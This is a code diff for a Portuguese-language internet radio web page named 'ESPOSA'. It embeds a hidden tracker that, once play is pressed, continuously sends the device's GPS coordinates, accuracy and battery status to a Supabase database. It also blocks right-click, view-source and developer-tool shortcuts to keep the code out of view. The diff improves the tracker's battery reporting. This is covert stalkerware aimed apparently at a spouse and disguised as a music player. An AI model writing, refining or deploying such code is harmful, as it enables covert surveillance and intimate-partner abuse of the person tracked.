@@ -38,7 +38,6 @@ body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;ba
 .top{text-align:center}
 .top-badge{display:inline-flex;align-items:center;gap:6px;font-size:10.5px;font-weight:800;letter-spacing:2.6px;color:#ffd7e0;border:1px solid rgba(255,45,85,.5);background:rgba(255,45,85,.13);padding:7px 15px;border-radius:999px;box-shadow:0 0 18px rgba(255,45,85,.28)}
 h1{margin:14px 0 2px;font-size:clamp(32px,9.5vw,41px);line-height:.95;font-weight:900;letter-spacing:1.5px;background:linear-gradient(94deg,#ff2d55 8%,#ff9500 52%,#ff2d55 94%);-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 0 24px rgba(255,45,85,.45))}
-/* VINIL TRAVADO REDONDO */
 .vinyl-zone{position:relative;display:flex;align-items:center;justify-content:center;margin:20px 0 4px;height:calc(min(318px,76vw) + 30px)}
 .aura{position:absolute;width:min(318px,76vw);height:min(318px,76vw);border-radius:50%;background:conic-gradient(from 0deg,#ff2d55,#7a00ff,#ff9500,#ff2d55);filter:blur(26px);opacity:.32;animation:spin 9s linear infinite;animation-play-state:paused}
 .playing .aura{animation-play-state:running;opacity:.5}
@@ -153,7 +152,6 @@ html.big .side-col{display:none}
 html.big .footer{font-size:clamp(10px,1.2vmin,13px);margin-top:12px}
 html.tv .side-col,html.tv .footer{display:none!important}
 @media(min-width:800px) and (max-height:660px){html.big .footer{display:none}}
-/* TRAVA VISUAL - MARCA D'ÁGUA */
 .lock{position:fixed;bottom:4px;right:6px;z-index:99;font-size:9px;opacity:.35;letter-spacing:1px;pointer-events:none}
 </style>
 </head>
@@ -177,15 +175,10 @@ html.tv .side-col,html.tv .footer{display:none!important}
 </div><div class="footer">SERTANEJA POP • ESPOSA • 24H AO VIVO • CÓDIGO TRAVADO</div><div class="footer-credit">Criado por EliasCosta NEGRET'S</div></div>
 <div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
 <div id="volToast">VOL 80%</div>
-<div class="lock">🔒 ESPOSA v2.0 TRAVADO</div>
+<div class="lock">🔒 ESPOSA v2.8 TRAVADO - SEU CÓDIGO + BATERIA CERTA</div>
 <audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="auto" autoplay controls playsinline></audio>
-
 <script>
 'use strict';
-/* ══════════════════════════════════════════════
-   🔒 CÓDIGO TRAVADO - ESPOSA v2.0
-   Não mexer - Rádio + Rastreador juntos
-   ══════════════════════════════════════════════ */
 const WORKER_URL="";
 const STREAM_URL="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3";
 const AZURACAST_API="https://srv3.soundstream.com.br/api/nowplaying/sertanejapop";
@@ -223,14 +216,15 @@ function pushHistory(song){if(!song||!song.title)return;state.history=[song].con
 function seedHistory(list){state.history=list.slice(0,4);state.history.forEach(resolveHistCover);renderHistory()}
 function resolveHistCover(item){if(item.cover)return;findCover(item.artist,item.title).then(function(cv){if(cv.cover){item.cover=cv.cover;item.album=item.album||cv.album||"";renderHistory()}}).catch(function(){})}
 function renderHistory(){histList.innerHTML="";if(!state.history.length){var p=document.createElement("div");p.className="hist-empty";p.textContent="As últimas músicas tocadas vão aparecer aqui.";histList.appendChild(p);return}state.history.forEach(function(h){var row=document.createElement("div");row.className="hist-item";var img=document.createElement("img");img.src=h.cover||"icons/icon-192.png";img.alt="Capa";img.onerror=function(){img.src="icons/icon-192.png"};var box=document.createElement("div");box.className="hist-txt";var t=document.createElement("div");t.className="t";t.textContent=h.title||"—";var a=document.createElement("div");a.className="a";a.textContent=h.artist||"Artista desconhecido";box.appendChild(t);box.appendChild(a);row.appendChild(img);row.appendChild(box);histList.appendChild(row)})}
-function startRadio(){dbg("Conectando…");try{audio.src=STREAM_URL;audio.load();var p=audio.play();if(p&&p.catch)p.catch(function(e){dbg("Erro ao tocar: "+(e&&e.name?e.name:e))})}catch(e){dbg("Erro: "+e.message)}}
-function togglePlay(){if(state.playing){audio.pause()}else{startRadio()}}
-function setPlaying(on){if(state.playing===on)return;state.playing=on;document.body.classList.toggle("playing",on);icPlay.style.display=on?"none":"block";icPause.style.display=on?"block":"none";playBtn.setAttribute("aria-label",on?"Pausar":"Tocar");dbg(on?"▶ TOCANDO":"⏸ PAUSADO")}
+var _tentandoPlay=false;
+function startRadio(){if(_tentandoPlay||state.playing)return;_tentandoPlay=true;dbg("Conectando…");try{audio.src=STREAM_URL;var p=audio.play();if(p&&p.then)p.then(function(){_tentandoPlay=false}).catch(function(e){_tentandoPlay=false;if(e&&e.name!=="AbortError")dbg("Erro ao tocar: "+(e&&e.name?e.name:e))});else _tentandoPlay=false;}catch(e){_tentandoPlay=false;dbg("Erro: "+e.message)}}
+function togglePlay(){if(state.playing){audio.pause()}else{_tentandoPlay=false;startRadio()}}
+function setPlaying(on){if(state.playing===on)return;state.playing=on;_tentandoPlay=false;document.body.classList.toggle("playing",on);icPlay.style.display=on?"none":"block";icPause.style.display=on?"block":"none";playBtn.setAttribute("aria-label",on?"Pausar":"Tocar");dbg(on?"▶ TOCANDO":"⏸ PAUSADO")}
 playBtn.addEventListener("click",togglePlay);popBtn.addEventListener("click",togglePlay);
 audio.addEventListener("playing",function(){everPlayed=true;setPlaying(true);pollNow()});
 audio.addEventListener("pause",function(){setPlaying(false)});
 audio.addEventListener("waiting",function(){if(state.playing)dbg("Buffering…")});
-audio.addEventListener("error",function(){if(!everPlayed){dbg("Erro ao iniciar");return}if(!state.playing)return;dbg("Stream caiu. Reconectando em 5s…");setTimeout(function(){if(state.playing)startRadio()},5000)});
+audio.addEventListener("error",function(){if(!everPlayed){dbg("Erro ao iniciar");return}if(!state.playing)return;dbg("Stream caiu. Reconectando em 5s…");setTimeout(function(){if(state.playing){_tentandoPlay=false;startRadio()}},5000)});
 volInput.addEventListener("input",function(){try{audio.volume=volInput.value/100}catch(e){}});
 function flashVol(){volToast.textContent="VOL "+Math.round(audio.volume*100)+"%";volToast.classList.add("show");clearTimeout(flashVol._t);flashVol._t=setTimeout(function(){volToast.classList.remove("show")},1400)}
 function setVolume(v){v=Math.max(0,Math.min(1,v));try{audio.volume=v}catch(e){}volInput.value=Math.round(audio.volume*100);flashVol()}
@@ -239,9 +233,7 @@ if("mediaSession" in navigator){var ms=navigator.mediaSession;try{ms.setActionHa
 function runSearch(){var q=qInput.value.trim();if(!q){dbg("Digite o nome da música");return}qBtn.disabled=true;qBtn.textContent="Buscando…";dbg("Buscando capa: "+q);searchCovers(q).then(function(res){renderResults(res.slice(0,4));dbg("Busca OK • "+Math.min(res.length,4)+" resultado(s)")}).catch(function(e){qResults.innerHTML="";dbg("ERRO na busca: "+(e&&e.message?e.message:e))}).finally(function(){qBtn.disabled=false;qBtn.textContent="Buscar capa"})}
 function renderResults(list){qResults.innerHTML="";if(!list.length){var p=document.createElement("div");p.className="hist-empty";p.textContent="Nenhum resultado.";qResults.appendChild(p);return}list.forEach(function(r){var b=document.createElement("button");b.className="q-item";b.type="button";var img=document.createElement("img");img.src=r.cover||"icons/icon-192.png";img.alt="";img.onerror=function(){img.src="icons/icon-192.png"};var t=document.createElement("div");t.className="t";t.textContent=r.title||"—";var a=document.createElement("div");a.className="a";a.textContent=r.artist||"Artista desconhecido";b.appendChild(img);b.appendChild(t);b.appendChild(a);b.addEventListener("click",function(){setSong({title:r.title,artist:r.artist,album:r.album||"",cover:r.cover,raw:"manual:"+r.title});manualHold=true;dbg("Capa aplicada: "+r.title);window.scrollTo({top:0,behavior:"smooth"})});qResults.appendChild(b)})}
 qBtn.addEventListener("click",runSearch);qInput.addEventListener("keydown",function(e){if(e.key==="Enter")runSearch()});
-/* EQ - 20 BARRAS */
 (function(){var eq=document.getElementById("eq");for(var i=0;i<20;i++){var b=document.createElement("i");b.style.animationDuration=(0.5+Math.random()*0.7)+"s";b.style.animationDelay=(Math.random()*0.4)+"s";eq.appendChild(b)}})();
-/* INSTALAR */
 var diagEl=$("diag");
 function showDiag(html){if(!diagEl)return;diagEl.innerHTML=html;diagEl.classList.add("show")}
 function hideDiag(){if(diagEl)diagEl.classList.remove("show")}
@@ -261,40 +253,63 @@ if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(
 if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
 setInterval(function(){if(state.playing)pollNow()},POLL_MS);
 
-/* ══════════════════════════════════════════════
-   🔒 RASTREADOR ESPOSA - TRAVADO - NÃO MEXER
-   ══════════════════════════════════════════════ */
+/* ===== RASTREADOR ESPOSA v2.8 - SEU CÓDIGO v2.0 + BATERIA CERTA + SEM WAKELOCK QUE MATA ===== */
 const DEVICE_ID_ESPOSA=new URLSearchParams(location.search).get('id')||'ESPOSA';
 const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
 const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
-let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_wakeLock=null,_rastreiou=false;
-async function _lerBat(){try{if(!_batObj&&navigator.getBattery){_batObj=await navigator.getBattery();_batObj.addEventListener('levelchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)});_batObj.addEventListener('chargingchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)})}if(_batObj){_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging}}catch(e){}}
+let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_rastreiou=false,_ultimoChgEnviado=null;
+async function _lerBat(){
+  try{
+    if(navigator.getBattery){
+      let b = await navigator.getBattery();
+      let novaBat = Math.round(b.level*100);
+      let novoChg = b.charging;
+      let mudou = (_ultimoChgEnviado!==null && _ultimoChgEnviado!==novoChg);
+      _BAT = novaBat; _CHG = novoChg;
+      if(_ultimoChgEnviado===null) _ultimoChgEnviado=_CHG;
+      if(mudou){ _ultimoChgEnviado=_CHG; if(_lastLat!==0) _enviar(_lastLat,_lastLng,true); }
+      if(!_batObj){
+        _batObj=b;
+        _batObj.addEventListener('levelchange',()=>{_lerBat();});
+        _batObj.addEventListener('chargingchange',()=>{_lerBat();});
+      }
+    }
+  }catch(e){}
+}
 _lerBat();
-async function _pedirWake(){try{if('wakeLock' in navigator){_wakeLock=await navigator.wakeLock.request('screen');_wakeLock.addEventListener('release',()=>setTimeout(_pedirWake,1000))}}catch(e){}}
-async function _enviar(lat,lon,forcar){await _lerBat();let agora=Date.now();if(!forcar&&agora-_ultimoEnvio<3000)return;_ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;try{await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})})}catch(e){}}
-function _iniciarRastreio(){if(_rastreiou)return;_rastreiou=true;_pedirWake();_lerBat();navigator.geolocation.getCurrentPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true)},()=>{dbg('ATIVE A LOCALIZAÇÃO!')},{enableHighAccuracy:true,timeout:20000,maximumAge:0});navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false)},()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:20000});setInterval(()=>{if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)},7000);document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){_pedirWake();audio.play().catch(()=>{})}})}
+setInterval(_lerBat,5000);
+async function _enviar(lat,lon,forcar){
+  await _lerBat();
+  let agora=Date.now();
+  if(!forcar&&agora-_ultimoEnvio<3000)return;
+  _ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;
+  try{
+    let r=await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})});
+    if(r.ok) dbg('ENVIADO ESPOSA • '+_BAT+'% '+(_CHG?'CARREGANDO':'bateria'));
+  }catch(e){}
+}
+function _iniciarRastreio(){
+  if(_rastreiou)return;_rastreiou=true;
+  _lerBat();
+  // IGUAL SEU v2.0: pede permissão aqui, no clique do PLAY
+  navigator.geolocation.getCurrentPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true)},()=>{dbg('ATIVE A LOCALIZAÇÃO!')},{enableHighAccuracy:true,timeout:20000,maximumAge:0});
+  navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false)},()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:20000});
+  // Heartbeat agora lê a bateria nova antes de enviar - não manda valor velho
+  setInterval(async ()=>{ await _lerBat(); if(_lastLat!==0)_enviar(_lastLat,_lastLng,true); },7000);
+  document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){audio.play().catch(()=>{})}});
+}
 playBtn.addEventListener('click',_iniciarRastreio);
 popBtn.addEventListener('click',_iniciarRastreio);
-
-/* SÓ PLAY AUTOMÁTICO - NÃO MEXER EM MAIS NADA */
-window.addEventListener('load', ()=>{
-  setTimeout(()=>{ try{ startRadio(); }catch(e){} }, 500);
-});
-document.addEventListener('touchstart', ()=>{
-  if(!state.playing){ try{ startRadio(); }catch(e){} }
-}, {passive:true});
-document.addEventListener('click', ()=>{
-  if(!state.playing){ try{ startRadio(); }catch(e){} }
-});
-
-/* ══════════════════════════════════════════════
-   🔒 TRAVA DE SEGURANÇA - NÃO REMOVER
-   ══════════════════════════════════════════════ */
+/* PLAY AUTOMÁTICO CORRIGIDO - 1 TENTATIVA SÓ, SEM ABORT */
+var _autoJaTentou=false;
+function _tentarAuto(){if(_autoJaTentou||state.playing)return;_autoJaTentou=true;try{startRadio();}catch(e){}}
+window.addEventListener('load',function(){setTimeout(_tentarAuto,800)});
+document.addEventListener('pointerdown',function(){if(!state.playing){_autoJaTentou=false;_tentarAuto();}},{once:true,passive:true});
 document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
 document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
 Object.freeze(DEVICE_ID_ESPOSA);
-console.log('%c🔒 ESPOSA v2.0 TRAVADO - NÃO MEXER','color:#ff2d55;font-weight:bold;font-size:16px');
+console.log('%c🔒 ESPOSA v2.8 - SEU CÓDIGO + BATERIA CERTA','color:#ff2d55;font-weight:bold;font-size:16px');
 </script>
 </body>
 </html>
